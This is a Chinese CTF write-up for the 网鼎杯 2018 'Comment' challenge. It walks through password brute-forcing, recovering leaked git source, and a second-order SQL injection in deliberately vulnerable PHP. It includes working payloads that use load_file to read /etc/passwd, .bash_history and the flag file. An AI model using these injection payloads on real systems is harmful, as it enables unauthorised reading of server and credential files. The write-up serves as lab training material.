# \[网鼎杯 2018]Comment

## \[网鼎杯 2018]Comment

## 考点

* git泄露与文件恢复
* 二次注入
* 代码审计
* SQL注入的load\_file函数

## wp

一开始没什么发现，注意到在login.php的登录框，似乎给出了账号密码，直接输入会提示用户名或密码错误，那可以尝试爆破一下密码后三位，最后为 zhangwei666，成功登陆。

```
zhangwei
zhangwei***
```

进行目录扫描发现git泄露，githack下载源码，发现源码不全，对其进行恢复

```
git log --reflog
git reset --hard e5b2a2443c
```

恢复后代码如下

```php
<?php

include "mysql.php";
session_start();

if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}

if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    $category = addslashes($_POST['category']);
    $title = addslashes($_POST['title']);
    $content = addslashes($_POST['content']);
    $sql = "insert into board
            set category = '$category',
                title = '$title',
                content = '$content'";
    $result = mysql_query($sql);
    header("Location: ./index.php");
    break;

case 'comment':
    $bo_id = addslashes($_POST['bo_id']);
    $sql = "select category from board where ";
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num>0){
    $category = mysql_fetch_array($result)['category'];
    $content = addslashes($_POST['content']);
    $sql = "insert into comment
            set category = '$category',
                content = '$content',
                bo_";
    $result = mysql_query($sql);
    }
    header("Location: ./comment.php?id=$bo_id");
    break;
    
default:
    header("Location: ./index.php");
}
}else{
    header("Location: ./index.php");
}
?>
```

可以看到源码的SQL语句，在 write 处，对所有输入进行 addslashes() 转义，但是在 comment 处，那个查询的 category 并未转义，即 category 就是一个二次注入的地方。<mark style="background-color:orange;">addslashes() 转义的字符有 单双引号，反斜杠和NULL</mark>

write时，在 category 输入 `',content=user(),/*`\
comment时，在 content 输入 `*/#`\
这样拼接之后的语句为

```
发帖
insert into board
            set category = '\',content=user(),/* ',
                title = '123',
                content = '123';

留言
select category from board where ;
category为',content=user(),/* 
嵌入语句
insert into comment
            set category = '',content=user(),/*',
                content = '*/#',
                bo_;
```

输入单引号闭合category后的单引号，然后在content插入payload，采用 `/**/` 进行多行注释，将 `',content = '` 注释，再使用`＃`单行注释后面的内容，这样原本content那行就被完全注释。

在数据库里面看了一圈没有发现，尝试进行文件读取，发现读取不了了/proc/self/cmdline和/proc/self/environ，那就读取.bash\_history

```
',content=(select load_file("/etc/passwd")),/*
',content=(select load_file("/home/www/.bash_history")),/*
```

得到的结果如下，做的事情就是先在/tmp下解压html压缩包，然后删除html压缩包，将html拷贝到/var/www/目录下，进入/var/www/html目录之下，删除 .DS\_Store

试了一下发现不存在flag.php，那就把下面的文件都试一下

```
cd /tmp/ unzip html.zip rm -f html.zip cp -r html /var/www/ cd /var/www/html/ rm -f .DS_Store service apache2 start
```

最终在 /tmp/html 下发现 .DS\_Store，由于直接读取不能全部输出，就先转换为 hex 编码再输出

```
',content=(select hex(load_file("/tmp/html/.DS_Store"))),/*
```

这样得到了一串十六进制字符串，将其中的00替换为空，然后解码，可以看到flag文件为flag\_8946e1ff1ee3e40f.php，读取即可

```
',content=(select hex(load_file("/var/www/html/flag_8946e1ff1ee3e40f.php"))),/*
```
